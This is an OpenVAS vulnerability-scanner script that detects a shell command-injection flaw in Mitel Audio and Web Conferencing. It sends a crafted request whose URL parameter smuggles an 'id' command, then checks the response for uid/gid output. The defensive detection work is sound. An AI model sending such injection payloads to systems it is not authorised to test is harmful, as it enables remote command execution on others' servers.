###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_AWC_45537.nasl 13 2013-10-27 12:16:33Z jan $
#
# Mitel Audio and Web Conferencing (AWC) Remote Arbitrary Shell Command Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Mitel Audio and Web Conferencing (AWC) is prone to a remote
command-injection vulnerability because it fails to adequately
sanitize user-supplied input data.

Remote attackers can exploit this issue to execute arbitrary shell
commands with the privileges of the user running the application.";

tag_solution = "The reporter indicates that updates are available; Symantec has not
confirmed this. Please see the references for details.";

if (description)
{
 script_id(103010);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-01-04 15:14:45 +0100 (Tue, 04 Jan 2011)");
 script_bugtraq_id(45537);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("Mitel Audio and Web Conferencing (AWC) Remote Arbitrary Shell Command Injection Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45537");
 script_xref(name : "URL" , value : "http://www.mitel.com/DocController?documentId=26451");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/515403");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if AWC is prone to a remote command-injection vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
   
url = string(dir, "/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26id%26"); 

if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {
     
  security_hole(port:port);
  exit(0);

}

exit(0);

